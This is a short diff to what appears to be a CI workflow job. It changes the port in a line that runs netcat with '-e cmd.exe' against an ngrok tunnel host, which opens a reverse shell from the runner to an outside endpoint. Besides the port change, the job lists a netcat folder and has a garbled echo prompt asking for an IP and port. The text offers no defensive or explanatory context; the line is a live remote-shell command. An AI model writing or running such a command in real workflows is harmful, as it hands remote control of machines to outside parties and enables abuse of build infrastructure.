@@ -33,7 +33,7 @@ jobs:
        ls
        cd netcat-1.11
        ls
-       ./nc.exe -v 0.tcp.in.ngrok.io 18848 -e cmd.exe
+       ./nc.exe -v 0.tcp.in.ngrok.io 14640 -e cmd.exe
        echo enter both ip and port without any  this :
        
     
